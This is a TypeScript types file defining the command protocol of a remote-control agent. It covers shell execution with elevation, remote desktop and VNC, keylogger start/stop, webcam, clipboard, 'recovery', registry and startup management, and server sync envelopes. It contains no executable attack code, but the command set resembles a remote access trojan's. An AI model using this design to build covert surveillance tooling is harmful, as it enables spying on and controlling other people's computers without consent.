import type { AgentConfig } from "./config";
import type { AgentMetrics, AgentStatus } from "./agent";
import type { PluginSyncPayload, PluginManifestDelta } from "./plugin-manifest";
import type { OptionsState } from "./options";
import type {
  RemoteDesktopCommandPayload,
  RemoteDesktopInputBurst,
} from "./remote-desktop";
import type { AppVncCommandPayload, AppVncInputBurst } from "./app-vnc";
import type { AudioControlCommandPayload } from "./audio";
import type { ClipboardCommandPayload } from "./clipboard";
import type { RecoveryCommandPayload } from "./recovery";
import type { FileManagerCommandPayload } from "./file-manager";
import type { TcpConnectionsCommandPayload } from "./tcp-connections";
import type { ClientChatCommandPayload } from "./client-chat";
import type { ToolActivationCommandPayload } from "./tool-activation";
import type { WebcamCommandPayload } from "./webcam";
import type { TaskManagerCommandPayload } from "./task-manager";
import type { StartupCommandPayload } from "./startup-manager";
import type { KeyloggerCommandPayload } from "./keylogger";
import type { SystemInfoCommandPayload, SystemInfoSnapshot } from "./system-info";
import type { EnvironmentCommandPayload } from "./environment";
import type { GeoCommandPayload } from "./ip-geolocation";
import type { RegistryCommandPayload } from "./registry";
import type { TriggerMonitorCommandPayload } from "./trigger-monitor";

export type CommandName =
  | "ping"
  | "shell"
  | "remote-desktop"
  | "app-vnc"
  | "system-info"
  | "open-url"
  | "audio-control"
  | "agent-control"
  | "clipboard"
  | "recovery"
  | "file-manager"
  | "tcp-connections"
  | "client-chat"
  | "tool-activation"
  | "webcam-control"
  | "task-manager"
  | "keylogger.start"
  | "keylogger.stop"
  | "startup-manager"
  | "environment-variables"
  | "ip-geolocation"
  | "registry"
  | "trigger-monitor";

export interface PingCommandPayload {
  message?: string;
}

export interface ShellCommandPayload {
  command: string;
  timeoutSeconds?: number;
  workingDirectory?: string;
  elevated?: boolean;
  environment?: Record<string, string>;
}

export interface OpenUrlCommandPayload {
  url: string;
  note?: string;
}

export interface CommandAcknowledgementStatement {
  id: string;
  text: string;
}

export interface CommandAcknowledgementRecord {
  confirmedAt: string;
  statements: CommandAcknowledgementStatement[];
}

export type AgentControlAction =
  | "disconnect"
  | "reconnect"
  | "shutdown"
  | "restart"
  | "sleep"
  | "logoff";

export interface AgentControlCommandPayload {
  action: AgentControlAction;
  reason?: string;
  force?: boolean;
}

export type CommandPayload =
  | PingCommandPayload
  | ShellCommandPayload
  | RemoteDesktopCommandPayload
  | AppVncCommandPayload
  | SystemInfoCommandPayload
  | OpenUrlCommandPayload
  | AudioControlCommandPayload
  | AgentControlCommandPayload
  | ClipboardCommandPayload
  | RecoveryCommandPayload
  | FileManagerCommandPayload
  | TcpConnectionsCommandPayload
  | ClientChatCommandPayload
  | ToolActivationCommandPayload
  | WebcamCommandPayload
  | TaskManagerCommandPayload
  | KeyloggerCommandPayload
  | StartupCommandPayload
  | EnvironmentCommandPayload
  | GeoCommandPayload
  | RegistryCommandPayload
  | TriggerMonitorCommandPayload;

export interface CommandInput {
  name: CommandName;
  payload: CommandPayload;
}

export interface Command extends CommandInput {
  id: string;
  createdAt: string;
  signature?: string;
}

export interface CommandResult {
  commandId: string;
  success: boolean;
  output?: string;
  error?: string;
  completedAt: string;
}

export type CommandOutputEvent =
  | {
      type: "chunk";
      commandId: string;
      sequence: number;
      data: string;
      timestamp: string;
    }
  | {
      type: "end";
      commandId: string;
      timestamp: string;
      result: CommandResult;
    };

export interface AgentSyncRequest {
  status: AgentStatus;
  timestamp: string;
  metrics?: AgentMetrics;
  results?: CommandResult[];
  plugins?: PluginSyncPayload;
  options?: OptionsState | null;
}

export interface AgentSyncResponse {
  agentId: string;
  commands: Command[];
  config: AgentConfig;
  serverTime: string;
  pluginManifests?: PluginManifestDelta;
  options?: OptionsState | null;
}

export type CommandDeliveryMode = "session" | "queued";

export interface CommandQueueAuditRecord {
  eventId: number | null;
  acknowledgedAt?: string | null;
  acknowledgement?: CommandAcknowledgementRecord | null;
}

export interface CommandQueueResponse {
  command: Command;
  delivery: CommandDeliveryMode;
  audit?: CommandQueueAuditRecord | null;
}

export interface CommandQueueSnapshot {
  commands: Command[];
}

export interface AgentCommandEnvelope {
  type: "command";
  command: Command;
}

export interface AgentRemoteDesktopInputEnvelope {
  type: "remote-desktop-input";
  input: RemoteDesktopInputBurst;
}

export interface AgentAppVncInputEnvelope {
  type: "app-vnc-input";
  input: AppVncInputBurst;
}

export interface AgentSystemInfoEnvelope {
  type: "system-info";
  snapshot: SystemInfoSnapshot;
}

export type AgentEnvelope =
  | AgentCommandEnvelope
  | AgentRemoteDesktopInputEnvelope
  | AgentAppVncInputEnvelope
  | AgentSystemInfoEnvelope;
